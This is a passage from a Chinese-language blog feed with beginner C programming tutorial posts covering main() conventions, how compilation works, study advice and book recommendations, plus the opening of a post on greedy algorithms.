0;</code>这条语句就是执行了一个函数返回的操作,任何函数,一旦执行到return语句,即意味着这个函数的执行立即结束,后面的代码无论多少都不会再继续执行,直接返回.return后面跟着的那个值也是一个表达式,可以放置任意和函数类型符合的,可以求值的表达式,此处main函数默认返回一个0,0就是一个值为0的常量表达式.</p><h3 id="总结">总结</h3><p>我们可以发现,一般情况下,一个完整c程序必须或应该包含以下几个部分:</p><p>1.使用<code>#include&lt;&gt;</code>命令进行头文件的包含,不同的头文件内包含了我们这个程序可能用到的各种函数等的信息</p><p>例如我们用于输出的<code>printf()</code>函数就在stdio.h这个头文件内</p><p>2.一个必须存在的函数,他是一切的开始—int main()函数</p><p>一个最规范正确(没有参数时)的main函数的格式应该是这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123; <span class="comment">// 代表main函数的返回值为int类型,同时没有任何参数</span></span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们最多可以把那个括号中的void省略,因为main中的void是在新标准中推荐添加的,我们基于C99版本进行学习即可.</p><p>你还可能看到这样的写法,我们暂时用不到,但他们是没有问题的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这样的:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> *envp[])</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//或者是这样的:</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> **envp)</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//甚至是这样的:</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> *envp[])</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这3种都没有问题,但是我们暂时用不到,特别是第3种.</p><p>另外,一切教导你这样写main函数的教材或书,请你扔掉它:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main()&#123;</span><br><span class="line"><span class="comment">//main前面没有int</span></span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="comment">//没有return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.其他过程,也就是其他的辅助函数,用于将功能独立出来</p><p>4.一些注释,用于标注这个程序是用来干什么的,或者某一段代码是干什么的</p><p>注意:一定要养成写注释的习惯,特别是程序越发复杂,更应该编写注释来以备日后回看,方便改进和维护.</p><h3 id="警惕-烂书-教你的错误写法">警惕&quot;烂书&quot;教你的错误写法</h3><p>之所以让你&quot;扔书&quot;,是想让你知道什么是该学的规范写法,什么是业余的写法:</p><p>1.只有旧标准才允许main前不加返回类型(也就是那个int).</p><p>2.此外,如果你发现有这么写的<code>void main()</code>,请毫不犹豫地把这本书扔掉,因为不加返回类型勉强可以说是对的,只不过是旧写法,但是唯独<code>void main()</code>,从来没有任何标准中写过这种写法是正确的.不信你可以在现在(2023年)找大众的编译器来编译,99%会报错.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183653567.png" alt="image-20230924183653567"><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183730275.png" alt="image-20230924183730275" style="zoom:33%;" /></p><p>从这两张图可以看出至少<code>main()</code>没有报错.实际上,<code>main()</code>的写法没有报错是为了对老程序的兼容性—毕竟前面所述,这是一种旧的写法,而不是完全错误的写法.我们学习,就要写<code>int main()</code>,或者你想加void也行.</p><h2 id="c代码是如何成为计算机程序的">C代码是如何成为计算机程序的</h2><p>学习C语言,或者说学习编程,就是和计算机打交道,多少要了解一些计算机的原理,否则,你学的C语言永远是花架子,找不到精髓.</p><p>我认为:一个计算机程序=算法+数据结构,同时他们也有交叉,一个完备的算法应该考虑到对应的数据结构;一种特定的数据结构应该为一个或一系列算法服务.</p><p>C代码,说到底还是一个文本文档,他只是记录了一个程序的逻辑,并不是一个可用的程序,那么作为一种编译型语言,想要把C源文件转换为可执行程序,就需要使用到专门的工具—C编译器(一切编译型语言都有自己的编译器,例如RUST有RUST自己的编译器),我们最常见的就是3种:GCC编译器,MSVC编译器,Clang编译器,我个人使用GCC来进行c代码的编译,他们大同小异,初学阶段无需考虑其差异,任何IDE都有对应的编译器可供使用.</p><p>这里的C源文件就是例如hello.c这样的以.c为后缀的文本文档,实际上它和.txt没有任何区别.他并不是二进制的文件.C编译器做的工作就是&quot;编译&quot;,同时这个&quot;编译&quot;实际上包含了许多操作:“预处理”-&gt;“编译”-&gt;“汇编”-&gt;“链接”,最终链接完成后才是最终的可执行文件,这里的知识点暂时没什么用,可以自行了解.你只需知道,源文件经过编译后才能成为真正的二进制程序用于运行.</p><p>一旦成为计算机程序,就和语言无关了,因为二进制程序是和系统架构严格相关的,RUST编译出来的程序,C++编译出来的程序,C编译出来的程序,都是给同一个系统使用的,也就是说,不管内部细节的话,某种程度上他们已经是和语言无关了.</p><h2 id="我们学了c语言是要干什么">我们学了C语言是要干什么</h2><p>了解了C语言的过程,我们作为C这门技术的使用者,我们的职责就是:</p><p><code>设计算法(或者由其他人设计好,例如数学家等)</code>-&gt;<code>构思程序</code>-&gt;<code>使用C语言进行程序的编写</code>-&gt;<code>进行调试测试</code>-&gt;<code>确认无误后生成正式的程序</code>-&gt;<code>将程序用于实际的生产作业来发挥作用</code>-&gt;<code>维护并改进</code>.</p><p>最关键的就是程序编写和调试测试.</p><br><p>—WAHAHA，2023.9.19</p><br><br><p>上一篇:<a href="../2023-09-19-2e85aaf67188/">写在前面</a></p><p>下一篇:<a href="../2023-09-30-4deceb66e98f/">C语言教程-1_2-关键概念</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程---写在前面</title>
      <link href="/2023-09-19-2e85aaf67188/"/>
      <url>/2023-09-19-2e85aaf67188/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么开始写这个教程">为什么开始写这个教程</h1><p>首先,写这篇文章的时候，我也是一名大二的学生，但是我是从初二就开始因为兴趣开始接触c语言，中途也是起起伏伏随便学到现在的。其实因为没有师傅领进门浪费了很多时间，而且这门语言身边也没有人愿意来用，就导致我壹个人在学这门语言。</p><p>尽管我个人很喜欢C语言,但毕竟C很老了，而且有很多后起之秀，未来这门语言的形势也未曾可知，但是作为一门我的启蒙语言，我目前体会最深刻的一门语言，我想把我对这门语言的看法记录下来，融入我的这篇教程（<s>随笔</s>），以后再回头也能回忆起当时这门语言对我的影响之深。</p><p>本教程面向C初学者、上网闲逛的C爱好者、以及需要深入学习C语言的朋友（比如CTF比赛中的PWN，RE选手），在很多时候我写一些工具反而更愿意使用C语言。如果各位想找到浅显快速的入门教程，那么也许<code>菜鸟教程</code>(是一个网站名,并没有任何别的意思doge)更适合您，如果您有充足的时间和兴趣，又没有精力去认真读一些C语言的书,那么这个文章可能比较适合您对C有进一步的认识。</p><p>很多人擅长编写程序，但是不是每一个人都是一个好的阅读者（阅读他人的代码），包括我也有非常大的学习进步空间—我也刚大二（逃~），特别是一名RE手，更要在面对IDA分析出的繁杂的伪代码（C伪代码）时有着敏锐的感觉。那么，对于C语言的理解、对于程序设计思想的认识就更为重要，要从程序的目的出发，去思考代码应该是什么样的（或者说也许会被写成什么样子）。</p><p>那么我现在就想从一个摸爬滚打的计算机fw的角度来把我自己的感悟记录下来，所以也许这篇教程更像是自己的一个笔记/记录，如果有幸被各位看到，有不认同的地方还请谅解，欢迎讨论。从现在开始，这篇教程就开始编写，无所谓被多少人看到（能看到最好—谁不想自己的努力被人认可呢doge），能写多少也未知晓，虽然会花费很多时间，但是愿意做这个记录，日后回看也是好事，但愿能多写一点。</p><p>​另外,由于是在博客中编写,所以请到我的博客的目录栏目中逐个点击阅读。</p><p>​在文章中,有一部分内容碍于篇幅和本人的能力,没有办法完全详细的写在其中,读者可以自行查阅资料,这也算是学习的一个环节.</p><p>（以上包含了一些个人的情绪，请忽略~~~doge）</p><p>​—WAHAHA，2023.9.19</p><h1 id="学习c语言应该保持怎样的态度">学习C语言应该保持怎样的态度</h1><p>（写完发现怎么写成“如何学习”教程了。。。）</p><h2 id="对c语言应该保持怎样的-学习-态度">对C语言应该保持怎样的(学习)态度</h2><p>我相信大部分学C语言的人都是被迫的，无论是因为学校的课程，亦或是需求所迫。目前在我看来，90%学C语言的人日后工作都不会再使用这门语言。RUST，golang，python等新语言，其他新技术的出现，还有C语言自身的不可否认的一些缺陷，都让C语言这个老古董逐渐退出舞台。所以本教程适合给想要好好学C的人看。</p><p>但是其实，C语言目前还是不可或缺的（2023年），很多人都会说，我也同样要说，目前在我看来，最接近底层，最容易理解的语言，还要属C语言，C仅次于汇编的简单粗暴让C在速度，自由度上有着极大的优势，同时这也是为什么C被称为中级语言的原因。而且这些特点也和C的发展历史、开发初衷不可分割。具体可以去看《C和指针》、《C专家编程》等书。</p><p>同时由于C语言的这些特性，也让他在当今显得不再合适，更高效率的开发模式依赖新技术，我个人支持，不过C语言我仍然放不下。虽然所谓的“C语言用来系统开发”，“C语言用来写底层非常高效”这些说法确实是C的强项，Linux，UNIX等系统，一些重要程序也都是纯C编写的，但是现在的开发讲求效率，便于维护，C语言就显得比较老旧。</p><p>但是无论C的形势如何，适合用C的地方，其他语言真的是不可替代的。想要应付考试，也可以移步其他教程更为快速有效，毕竟本人还是想好好的把自己的心得记录下来，<strong>而不是简单的应付考试</strong>。</p><h2 id="如何成为一个合格的学习者">如何成为一个合格的学习者</h2><p>废话一大堆，我认为学C语言最重要的一点就是“<code>认清你的目标</code>”，你的目标决定了你的学习方法，深入学习和快速上手是不一样的，如果您确实对C有着很大的好感，例如作为兴趣，那么欢迎来看我的文章，并欢迎讨论。如果您需要快速上手，那么也许菜鸟教程，一些视频课程应该更适合您。</p><p>同时还要“<strong>自觉主动</strong>”，学习是自己的事情，特别是认真学习C语言更是你的选择，不要想着别人应该有义务去教你，有不懂的地方，自觉查资料，自己去弄懂，C语言是一门技能，而不是一门课程，按照学一门课程的思维去学习C语言是掌握不了这门技能的。</p><p>学习不可避免要提问，“<code>提问的艺术</code>”是必须掌握的，无论你学什么，你都应该先认真掌握提问的艺术！！！</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/3cfd9b4a0f10ffb73edd760db6f89b24.jpg" alt="3cfd9b4a0f10ffb73edd760db6f89b24" style="zoom:50%;" /><p>具体请移步↓</p><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md</a></p><p>“提问的艺术”中，我着重要强调的一点是“<strong>保持礼貌</strong>”，别人不是你的学习工具，没有哪怕一丁点的义务去帮助你，所以，无论是面对你的学长/学弟/老师/同学/学习群友/论坛坛友/团队成员,都(TMD)放尊重点!!!（我没有自视甚高的意思）因为见过很不礼貌的人（某些学习群群友等）,他最终不仅得不到任何的帮助,反而让回答者感到很不舒服，甚至会挨骂。</p><p><code>吾师道也，夫庸知其年之先后生于吾乎？是故无贵无贱，无长无少，道之所存，师之所存也。任何人只要有技术,都可以成为你的老师,面对有学问的人,首当其冲的就是尊重。</code></p><p>接下来要注意的就是，<code>永远不要高估自己的实力</code>，也不要过分相信自己的判断，保持谦虚求实的态度会让你进步的更加迅速。</p><h1 id="技术方面上学习c语言的注意事项">技术方面上学习C语言的注意事项</h1><p>下面是一些常见的问题,读者必须注意(除非你想在提问时被回答者骂,或者浪费大量时间甚至放弃学习C语言)</p><h2 id="我要买一本什么书来看">我要买一本什么书来看?</h2><p>能看懂书就不要看视频,实在看不懂书再看视频,绝对不要看烂书!</p><p>看书(文档资料)学的绝对比看视频学的精(坚定),当然效率方面各位自行评判,这里本人不想挨骂…</p><p>下面的清单是推荐的各种书(2023年),这些书其实足矣↓</p><h2 id="书籍阅读以及学习路线-清单">书籍阅读以及学习路线(清单)</h2><ol><li><p>学习电脑操作快速入门-B站视频</p><p>你需要学会:</p><ol><li>学会开关机,<code>打开</code>windows的各种自带软件(例如文件管理器,任务管理器)</li><li>学会使用<code>QQ</code>,微信,WPS,OFFICE(能基本的使用就行),<code>浏览器</code>,网易有道词典,火绒</li><li>学会解压文件,打包文件,了解各种常见的文件后缀名都是什么,如何使用</li><li>自己能够<code>独立</code>安装<code>任何</code>市面上<code>常见</code>的软件并<code>规划安装路径</code>(这步没学会请不要开始学习编程)</li><li><code>非必要</code>不要将软件装到C盘</li><li>学会<code>打字</code>,学会用鼠标(这步没学会请不要开始学习编程)</li><li>能用电脑解决的计算机任务(手机也是计算机)就不要用手机解决</li><li>学会截图(这步没学会请不要开始学习编程)</li><li>学会截图</li><li>学会截图</li><li>提问时不要使用手机拍照(开始学习编程后请学会此步,否则请放弃学习编程)</li></ol></li><li><p>C语言简易入门书： 《啊哈！C语言》 (比较清晰易懂，实在小白可以看这本找找感觉)</p></li><li><p>C语言<code>新标准(C11)</code>优质书: 《C语言程序设计-现代方法(第2版,修订版)》 (相对全面介绍新标准,鼓励!)</p></li><li><p>C语言公认&quot;圣经&quot;: 《C Primer Plus（中文第6版）》 (C99标准经典好书,十分全面,新手读起来有点难,适合当工具书)</p></li><li><p>查漏补缺的书: 《你必须知道的495个C语言问题》 (你几乎可以在这里找到你初学C语言遇到的所有问题)</p></li><li><p>C语言进阶3件套(如果你还想继续深入学习<code>C语言</code>的艺术)</p><p>C编程风格与思想：《C专家编程》</p><p>C语言的细枝末节与问题：《C陷阱与缺陷》</p><p>C语言的灵魂-指针：《C和指针》(大大滴好书！你不会指针?你不配说学过C语言,一点都不配,我说的)</p></li><li><p>学习数据结构(C语言相对熟练后,开始数据结构的学习,别问,你一个学<code>计算机</code>跑不掉)</p><p>实践与思想结合，深化思想： 《数据结构与算法分析（C语言描述）原书第2版》 （好书，建议看这本）</p><p>考研用的…与实际脱节…全是理论: 《数据结构（C语言版）严蔚敏著》 （为了考试而生…）</p><p>C++描述的一本书,不建议新手从头到尾看: 《数据结构、算法与应用 C++描述》 (没学C++就算了)</p><p>另外一本C++描述的书，同样不建议新手从头到尾看： 《数据结构与算法分析 C++语言描述》</p><p>看书看不进去？找一个知识清单，直接<code>谷歌</code>一个知识点一个知识点地找</p></li><li><p>学习算法(实际上你从学习C语言的时候就开始了,<code>gcd()</code>就是一个算法…)</p><p>简易入门书： 《啊哈！算法》 （蛮简单的，适合入门捏）</p><p>图确实清晰： 《算法图解》 （还可以的）</p><p>各种信息学奥赛的教材都可以: 《信息学奥赛一本通》《算法训练营套装》 （别问，问就是卷疯了）</p><p>例题很多：《算法基础与在线实践》 （题可能有点难）</p><p>算法&quot;圣经&quot;: 《算法导论》 （萌新快跑，有人推荐你直接看这个，直接骂他，我说的）</p></li><li><p>深入底层（如果你仍然喜欢探究原理的话…勇士!)</p><p>书如其名： 《编译原理》</p><p>手搓CPU指令集(开玩笑)： 《深入理解计算机系统》 （传说中的<code>CSAPP</code>）</p><p>学汇编吧: 《汇编语言（第3版）王爽著》 （8086汇编经典，16位汇编其实相对x86，x64难一点，因为有<code>段</code>的概念）</p></li><li><p>转向其他语言</p><p>C++: C语言的超集,不过已经超脱于C,该语言异常地复杂(不信邪的来学学),惊人的学习成本,难以学习,慎重考虑,不过STL很香(doge)</p><p>Python: 十分方便的一门解释型语言,有大量第三方库,十分好用(学计算机的还是学学吧,绝对不吃亏)</p><p>Java: 貌似主要是web库蛮好的…不太了解…</p><p>RUST: 新语言,目前生态不完善,有待观望</p><p>Golang: 不知道…</p></li></ol><br><p>对上面的一些解释:</p><ol><li><p>上面的列举更多的是<code>清单</code>,而不是<code>路线</code>,书名前是书籍的客观描述(出于个人,不喜勿喷),书名后括号是个人的态度(出于个人,不喜勿喷),各个方向的书中选择适合自己的,可以几本书结合起来,取长补短.</p></li><li><p>电脑操作十分重要,一定要学会!</p></li><li><p>各位往往从C语言入门,而不再深入,适时转向其他语言这很正常.不过底层知识作为计算机er还是十分重要的.</p></li><li><p>算法这一概念十分广泛,小到<code>最大公因数求解</code>,大到<code>机器学习</code>,也有着十分庞大的分支.学习<code>数据结构</code>的时候往往逃脱不开对应的<code>算法</code>,换言之,算法和数据结构密不可分,包括实际的代码实现,请不要将其视为三个不相干的板块.</p></li><li><p><code>注意:</code> 大名鼎鼎的&quot;谭浩强C语言&quot;(红书),对书不对人,谭老的这本书虽然经典,但是放在现在(2023年)有点过时了,而且这本书的习题集<code>真的别做</code>,很多都是错误的.不过这本书的第五版更新了,感觉还可以.</p></li><li><p>不要看任何听都没听过的书!常常为《XX语言程序设计》等.书中有问题你就被坑惨了.</p></li></ol><h2 id="我的代码为什么跑不通了-软件问题">我的代码为什么跑不通了?软件问题?</h2><p>作为C语言的学习者，你不可避免的会遇到很多看似正确，实则错误的写法，这也许怪不得你，因为<code>C语言如此精简</code>使得很多不经意的修改并不会导致语法上的错误，甚至在逻辑结果上在小范围内都不会有任何问题。所以，如果你发现你的程序换一个输入或者做了一个小修改，结果就不对了，请<code>首先不要质疑你的编译器/IDE/操作系统等等---他们一般情况下比你高明多了，先去考虑自己的代码哪里有问题</code>。</p><h2 id="我的软件怎么配置不好">我的软件怎么配置不好?</h2><p>初学，不要纠结任何软件问题，不要去考验自己，我本人是<code>极其不建议</code>新手去使用VSCode等需要高度自定义的软件的（并没有批评VSCode的意思），一句话：“先让程序跑起来，能跑就行”.后面会有专门的篇章进行讲解软件的选择和安装.</p><h2 id="好多重点-我要不要记笔记">好多重点,我要不要记笔记?</h2><p>学习C语言过程中，个人建议不要用任何笔记软件做哪怕任何笔记（ASCII码表等硬性知识除外），因为这样效率太低了!</p><p>请学习一点知识，打开你的编辑器，写一个特定功能的程序，<code>把你的笔记作为这个程序的注释放进去</code>，<code>存好这个程序</code>，这才是实打实的东西！！！</p><p>当然，如果您想要做博客总结，当然十分好，这里建议使用Typora+Hexo框架来做笔记发博客。</p><h2 id="没电脑-其他设备可以用吗">没电脑,其他设备可以用吗?</h2><p>可以,如果你实在没电脑的话,用手机平板都是可以的,这时候就别想着这些平台的编译器能有多好用,能跑就行.</p><p>所以,有条件的话还是要配一台电脑的,哪怕是十年前的烂电脑都行.</p><h1 id="学习技巧">学习技巧</h1><h2 id="我需要从哪里寻找资料">我需要从哪里寻找资料?</h2><h3 id="使用搜索引擎">使用搜索引擎</h3><p>首先,利用好<code>搜索引擎</code>,这里的搜索引擎主要是<code>Bing,google</code>这两个,所谓的<code>中文必应,英文谷歌</code>,在这里不建议用百度.</p><p>别问,问就是学计算机的没人用百度去搜索,什么都搜不到…</p><p>我们来尝试搜索一下<code>ebp寄存器</code>来做个对比:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004405786.png" alt="image-20230930004405786" style="zoom: 30%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004427966.png" alt="image-20230930004427966" style="zoom:30%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004450210.png" alt="image-20230930004450210" style="zoom:30%;" /><p>我们来看一下前几条结果…</p><p>1.百度给了个百度百科,给了一篇csdn博客,然后就是b站视频…</p><p>2.必应给一篇文章突出显示,然后后面全是相关文章…</p><ol start="3"><li>谷歌搜索出来的全是相关文章…</li></ol><p>很显然…百度搜出来的都是什么玩意…所以,<code>我们一定要学会用必应或者谷歌去查找资料!</code></p><p>而且,如果你在中文网站找不到满意的资料,不<code>妨试试看国外的文章</code>,相信你很有可能会找到满意的答案!</p><h3 id="利用好一些网站">利用好一些网站</h3><p>学习C语言,我还真没有用过什么网站,这里想说的就是,如果你找到了一些比较好的网站,请多去翻翻看,也许就能找到答案.</p><p>而且,有一些公认的程序员必备网站,我们应该多加利用:</p><h4 id="1-github">1.GitHub</h4><p>开发者极其重要的网站：<a href="https://link.zhihu.com/?target=https%3A//github.com/">https://github.com</a></p><p>这个网站上面有大量的资源,许多开发者都将自己的代码托管在上面,我们可以在上面找到不计其数的工具,项目等,只有你想不到,没有他没有的东西.</p><p>同时,这个网站不仅仅是C语言,只要你从事计算机行业,这个网站你绝对逃不掉!而且,许多学生认证也看的是这个平台!</p><h4 id="2-b站">2.B站</h4><p>国内的许多好视频教程都在这上面有发布,许多免费课都有,如果你需要短时间了解一门技术,不妨来B站试试看.</p><h4 id="3-stack-overflow">3.<strong>Stack Overflow</strong></h4><p><strong>Stack Overflow — 解决 bug 的社区：<a href="https://link.zhihu.com/?target=https%3A//stackoverflow.com/">https://stackoverflow.com/</a></strong></p><p>这是一个非常专业的交流平台,不同于博客网站,上面的大量问题都是有着非常专业的回答,如果有能力,一定要多在这上面寻求帮助.</p><h4 id="4-csdn">4.csdn</h4><p>说实话…这个网站现在有点废…因为任何人随便发几句随笔,就能当做博客丢上去了,就导致csdn上面的信息良莠不齐,如果是临时查找一些简单的知识,可以来csdn找找,更专业的知识…最好去<code>博客园</code>等网站看看.</p><p>而且好多都收费…没钱…</p><h4 id="5-cppreference">5.cppreference</h4><p>中文网站:<a href="https://zh.cppreference.com/mwiki/index.php?title=%E9%A6%96%E9%A1%B5&amp;variant=zh-cn">https://zh.cppreference.com/mwiki/index.php?title=首页&amp;variant=zh-cn</a></p><p>这可是<code>标准文档</code>啊!标准文档!这上面是非常权威的解释!</p><p>如果你在和某人讨论一些语法概念的细节,不如直接拿标准说话!</p><p><code>&quot;你说的听起来没毛病,但是标准是这么说的吗?如果不是,那你就是错的!&quot;</code></p><p>并没有什么所谓&quot;不要挑战权威&quot;的意思,我们是学习编程,学的是别人创造出来的技术,不是你在开发技术,有什么疑问,那么这么语言的开发维护者有绝对的话语权!</p><h4 id="6-微软msdn">6.微软MSDN</h4><p>也许你在学习VS怎么使用,或者你在学习Win32API,请查询微软官方的在线文档.</p><p><a href="https://learn.microsoft.com/zh-cn/docs/">https://learn.microsoft.com/zh-cn/docs/</a></p><h3 id="多听建议">多听建议</h3><p>相信大部分人都有厉害的学长学姐(还有同辈,学弟学妹)…多去问问他们…你会有收获的doge</p><h2 id="也许我需要一些前置知识">也许我需要一些前置知识?</h2><h4 id="学会使用电脑">学会使用电脑</h4><p>(参见前面的<code>书籍清单以及...</code>)</p><p>虽然这个标题听起来有点搞笑,但是事实就是如此—不是每个开始学C语言的人都能流畅的使用电脑(包括各种技巧).</p><p>但是,我必须指出的是,如果你能轻松的使用电脑,甚至多少了解一些计算机(电脑)的基本原理,那么你学习C语言入门会轻松的起飞!</p><p>因为,<code>学习编程,某种程度上就是在学习如何从计算机的角度去考虑如何解决一个问题</code>!</p><p>各位如果确实欠缺这方面的知识(例如从来没用过电脑),可以去买一本大学计算机基础的书,简单补一下知识…</p><p>或者,至少你应该知道如何在Windows操作系统下正常安装各种软件,使用QQ进行聊天,学会使用电脑的截图,记住常用的Windows快捷键等等,如何使用电脑浏览器去搜索资源并下载…</p><h4 id="基础数学">基础数学</h4><p>1+1=2是不够的…</p><p>虽然不要求你在学C之前必须掌握如何求解一元二次方程…但是我们学习C语言的一个最简单的用途就是求解数学方程…那么你如果连方程是什么都不知道…那么…你懂…</p><p>想要学好C语言,至少要有高中的数学知识—不会就学,有些地方的初中比一些高中还nb…不要求你能流畅做出高考导数题,起码要知道导数是啥.</p><p>绝对值,开方,三角函数这些要知道吧…都是基础.</p><p>另外,像<code>素数判断,最大公因数,最小公倍数的求法</code>等最基本的数学算法,你也应该掌握—至少掌握一种求法.</p><p>如果这些没问题了,我们C语言用来解决数学问题的时候,当然需要你知道这些数学问题,比如基本的线性代数,我们要写一个矩阵求逆的算法,你需要知道矩阵是什么,如何求逆.</p><p>等等…</p><p>当然,并不是说学了C语言就一定要去编写这些东西,但是有一点能保证的是,有实力的程序员对这些都是非常熟练的.总之,数学知识可以不够,但是至少你的数学思维多少要到位!</p><h4 id="学英语">学英语</h4><p>这个没的说,许多网站都是英文的,虽然我们有翻译软件,但是毕竟翻译出来的专业名词和原文还是有差异的,最好要差不多能读懂一些英文的文章.</p><p>但是,学编程和英语真的没啥关系…尽管我们使用英文字符去编码…你看到的代码中那一堆所谓的&quot;英文&quot;,其实大部分都是起的变量名而已,找个词典一查,复制粘贴出来就行…</p><h2 id="写代码的时候">写代码的时候</h2><p>不要手写！</p><p>敲代码-&gt;可以调试,手写代码-&gt;肉眼生盯</p><p>注意代码格式规范,养成较好的代码规范更有助于理解代码.</p><p>写注释!如果一段代码比较复杂/比较重要,请写注释!</p><br><p>别的需要的我暂时想不到了…想到了再补充…</p><h1 id="约定和注意事项">约定和注意事项</h1><h2 id="本教程的问题">本教程的问题</h2><p>本教程的问题很明显,前后可能不太连贯,很多知识会&quot;放到后面讲&quot;,出现这个问题的原因是笔者想将各个概念讲好,而不是一带而过.</p><p>另外,教程可能不会包含一些非常简单的，在书上就能找到的东西—例如一些基本的计算机常识—你应该同时找一本书作为参考或者多去搜索！</p><h2 id="可能存在的超前的内容">可能存在的超前的内容</h2><p>因为本书主要从讲解思路作为切入点,所以一些代码片段可能还没有讲解,就放进来作为示例了.</p><p>所以本教程默认各位连着看下来,同时有较强的搜索能力和理解能力—实际上就是希望大家尽量学会去<code>猜---猜代码的用途</code>,你可能并不需要把某一行代码彻底理解,只要猜出来结果是干什么的就行.</p><p>例如:笔者会直接引入输入输出的两个函数—<code>scanf()和printf()</code>,此时,你应该做到无需关心这两个函数的原理和写法,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于给a输入一个整数,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同理,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于输出a的值,也就是<code>3</code>,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同时,<code>int a=3;</code>读者可能不知道int是干什么的,但是看到a=3就应该意识到:<code>总之这行代码就是让一个变量a的值为3</code>.</p><p>其他同理,学习要学会去适当合理的猜测.</p><p><code>另外,所有&quot;超前&quot;的内容,后面一定会讲到!</code></p><br><p>那么，讲到现在，也算是发了一点牢骚—因为踩过坑，不想让其他人再踩.之后就正式开始写教程.</p><p>​—WAHAHA，2023.9.27</p><br><br><p>下一篇:<a href="../2023-09-19-d1f77d78f8b6/">c语言教程-1-什么是程序</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法思想</title>
      <link href="/2023-09-18-51f1d01423f5/"/>
      <url>/2023-09-18-51f1d01423f5/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是贪心">什么是贪心</h1><h2 id="描述">描述</h2><p>总是做出<strong>当前</strong>最好的选择,期望通过<strong>局部</strong>最优选择得到<strong>全局</strong>最优的解决方案</p><p>即从问题的初始解开始一步一步选择当前最优,逐步逼近问题的目标,即使得不到最优解也能得到其近似</p><h2 id="本质">本质</h2><h3 id="使用条件">使用条件</h3><p>贪心选择性质:原问题的整体最优解可以分解为一系列相似的局部最优解,每一步的选择都依赖于前面的选择,但不依赖于未作出的选择</p><h3 id="最优子结构性质">最优子结构性质</h3><p>当一个问题的最优解包含其子问题的最优解时，称此问题具有最优子结构性质</p><p>原问题S= {a1,a2 ,…,ai,…,an }，通过贪心选择选出一个当前最优解{ai}之后，</p><p>转化为求解子问题S -{ai }，如果原问题的最优解包含子问题的最优解，则说明该问题满足最优子结构性质</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230918020525646.png" alt="image-20230918020525646" style="zoom:50%;" /></p><h2 